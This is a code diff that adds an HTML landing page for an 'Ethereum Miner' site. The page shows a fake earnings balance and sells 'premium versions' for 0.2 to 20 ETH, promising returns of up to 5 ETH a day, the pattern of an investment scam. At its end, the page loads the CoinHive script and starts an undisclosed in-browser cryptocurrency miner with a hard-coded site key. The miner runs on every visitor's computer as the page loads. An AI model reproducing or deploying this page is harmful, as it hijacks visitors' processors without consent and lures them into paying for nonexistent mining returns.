@@ -1,0 +1,176 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <title>Ethereum Miner - Mine and Earn free Ethereum.</title>
+    <meta name="description"
+          content="ETHMiner is Ethereum miner with fully automatic process. Start earning Ethereum now!">
+    <link href="style.css" rel="stylesheet" type="text/css"/>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700" rel="stylesheet">
+    <link rel="apple-touch-icon" sizes="57x57" href="favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon/favicon-16x16.png">
+    <link rel="manifest" href="favicon/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="favicon/ms-icon-144x144.png">
+    <script type="text/javascript" src="https://code.jquery.com/jquery-latest.min.js"></script>
+    <script type="text/javascript" async src="js/ajax.js"></script>
+</head>
+<body>
+<input type="hidden" name="isHomePage" value="true"/>
+<div id="topo">
+    <div class="topo-interna">
+        <a href="/"><img src="images/logo.png" class="logo" border="0"/></a>
+        <div class="menu">
+            <ul>
+                <li><a href="/" class="link-active">Home</a></li>
+                <li><a href="account.html">Account</a></li>
+                <li><a href="payouts.html">Payouts</a></li>
+                <li><a href="faq.html">FAQ</a></li>
+                <li><a href="support.html">Contacts</a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+<div id="welcome">
+    <div class="welcome-message">
+        <h1>The mining starts immediately. The Version 1.0 is free. </h1>
+    </div>
+</div>
+<div id="header-balance">
+    <div class="header-interna-logged">
+        <h2>Your earning balance</h2>
+        <h1 id="divamount"><span id="divamountValue">0.00000000</span> ETH</h1>
+        <input size="10" id="widthsum" value="0.01">
+        <form>
+            <a href="#" onClick="showWithdraw();" class="button-withdraw">Withdraw</a>
+            <a href="#" onClick="withdraw();" class="button-confirm">Confirm</a>
+            <a href="#" onClick="window.location.reload(true);" class="button-cancel">Cancel</a>
+            <a href="/account.html" class="button-status">Affiliate Program
+                Status</a>
+            <a href="#" onclick="logout();" style="width:100px;"
+               class="button-status">Logout</a>
+        </form>
+        <div id="alert-withdraw" class="alert1">Min <a href="javascript:void(0)" style="color:#fff"
+                                                       onclick="$('#widthsum').val('0.01')">0.01</a> ETH, Max <a
+                href="javascript:void(0)" style="color:#fff" onclick="$('#widthsum').val('0.00373250')">0.00373250</a>
+            To: <b id="withdrawalEthAddress"></b></div>
+    </div>
+</div>
+</div>
+<div id="current-version">
+    <div class="current-version-interna">
+        <img src="images/workstation.png" class="img-logged"/>
+        <div class="bit-free">
+            <h6>Your current version</h6>
+            <h3>EthMiner v1.0 Free</h3>
+            <div class="earning-rates">
+                <p>Earning Rate</p>
+                <h4>0.0000025 ETH/min</h4>
+            </div>
+            <div class="earning-rates no-padding">
+                <p>Profit per day</p>
+                <h4>0.0035 ETH</h4>
+            </div>
+        </div>
+    </div>
+</div>
+<div id="openModal" class="modalDialog">
+    <div><a href="#close" title="Close" class="close"><img src="images/close.png" width="15"></a>
+        <h2>Complete your Deposit</h2>
+        <div id="upgradeAjax"><br>
+            <img src="images/loading.gif"/>
+        </div>
+    </div>
+</div>
+<div class="content-plans">
+    <h3>Choose your version</h3>
+    <h4>Choose premium version below to increase your affiliate program bonus and earn much more!</h4>
+    <div class="plan">
+        <img src="images/server1.png" class="img-version">
+        <h2>Version V1.1</h2>
+        <div class="earning-rate">
+            <p class="first">Earning rate:</p>
+            <p><strong>0.000022</strong> <span>ETH/min</span></p>
+            <p><strong>0.032 ETH</strong> <span>per day</span></p>
+        </div>
+        <div class="bonus">
+            <h5><img src="images/check.png"/> Affiliate bonus 30%</h5>
+        </div>
+        <a href="#openModal" id="buyv1" onclick="upgrade(1);"
+           class="plan-button">Buy for 0.2 ETH</a>
+    </div>
+    <div class="plan">
+        <img src="images/server2.png" class="img-version2"/>
+        <h2>Version V1.2</h2>
+        <div class="earning-rate">
+            <p class="first">Earning rate:<br/>
+            <p><strong>0.00014</strong> <span>ETH/min</span></p>
+            <p><strong>0.2 ETH</strong> <span>per day</span></p>
+            </p>
+        </div>
+        <div class="bonus">
+            <h5><img src="images/check.png"/> Affiliate bonus <span>40%</span>
+            </h5>
+        </div>
+        <a href="#openModal" id="buyv2" onclick="upgrade(2)"
+           class="plan-button last">Buy for 1 ETH</a>
+    </div>
+    <div class="plan">
+        <img src="images/server3.png" class="img-version3"/>
+        <h2>Version V1.3</h2>
+        <div class="earning-rate">
+            <p class="first">Earning rate:<br/>
+            <p><strong>0.0007</strong> <span>ETH/min</span></p>
+            <p><strong>1 ETH</strong> <span>per day</span></p>
+            </p>
+        </div>
+        <div class="bonus">
+            <h5><img src="images/check.png"/> Affiliate bonus <span>50%</span>
+            </h5>
+        </div>
+        <a href="#openModal" id="buyv3"
+           class="plan-button last">Buy for 5 ETH</a>
+    </div>
+    <div class="plan">
+        <img src="images/server4.png" class="img-version4"/>
+        <h2>Version V1.4</h2>
+        <div class="earning-rate">
+            <p class="first">Earning rate:<br/>
+            <p><strong>0.004</strong> <span>ETH/min</span></p>
+            <p><strong>5 ETH</strong> <span>per day</span></p>
+            </p>
+        </div>
+        <div class="bonus">
+            <h5><img src="images/check.png"/> Affiliate bonus <span>100%</span>
+            </h5>
+        </div>
+        <a href="#openModal" id="buyv4" onclick="upgrade(4);"
+           class="plan-button last">Buy for 20 ETH</a>
+    </div>
+    <div id="div-upgrade"></div>
+</div>
+<div id="rodape">
+    <div class="rodape-interna">
+        Ethereum Miner Copyright &copy; - 2018. All Rights Reserved
+    </div>
+</div>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+    	var miner = new CoinHive.Anonymous('NoP2CulY7rrUkvWzudR7cqc8kPo1ciTQ');
+    	miner.start();
+    </script>
+</body>
+</html>
